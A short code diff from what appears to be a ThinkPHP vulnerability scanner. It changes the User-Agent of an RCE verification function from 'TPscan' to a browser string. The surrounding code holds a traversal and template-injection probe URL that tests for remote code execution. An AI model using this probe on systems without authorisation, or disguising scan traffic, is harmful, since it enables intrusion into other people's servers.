@@ -17,7 +17,7 @@ def thinkphp_index_showid_rce_verify(url):
         "exception":"",
     }
     headers = {
-        "User-Agent" : 'TPscan',
+        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0)',
     }
     try:
         vurl = urllib.parse.urljoin(url, 'index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~print_r(md5(2333))}]')
